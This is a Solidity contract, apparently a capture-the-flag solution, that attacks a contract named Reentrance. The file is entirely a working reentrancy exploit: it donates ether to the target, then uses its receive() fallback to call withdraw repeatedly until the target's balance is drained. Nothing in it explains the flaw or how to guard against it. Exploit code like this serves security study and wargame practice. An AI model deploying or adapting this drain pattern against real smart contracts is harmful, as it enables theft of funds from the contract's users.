// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

import {Reentrance} from "./Reentrance.sol";

contract ReentranceAttacker{
  Reentrance reentranceContract;
  uint256 attackAmount;
  
  constructor(address _reentranceContract) public{
    reentranceContract = Reentrance(payable(_reentranceContract));
  }

  function attack() public payable{
    attackAmount = msg.value;
    reentranceContract.donate{value: attackAmount}(address(this));
    reentranceContract.withdraw(attackAmount);
  }

  receive() external payable{
    uint256 contractBalance = address(reentranceContract).balance;

    while(contractBalance > attackAmount){
      reentranceContract.withdraw(attackAmount);
      contractBalance -= attackAmount;
    }

    reentranceContract.withdraw(contractBalance);
  }
}